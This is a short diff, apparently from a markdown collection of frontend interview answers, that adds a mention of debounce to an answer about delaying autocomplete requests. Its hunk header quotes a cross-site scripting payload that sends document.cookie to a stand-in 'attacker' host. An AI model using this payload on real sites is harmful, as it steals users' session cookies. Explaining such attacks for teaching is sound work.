@@ -1446,7 +1446,7 @@ window.location='http://attacker/?cookie='+document.cookie
 
 #### 38. How to set delay time for autocomplete request? (Apple Interview)
 
-* We could leverage setTimeout() for this
+* We could leverage setTimeout() for this, better approach should be debounce
 
 ```javascript
 var timer;
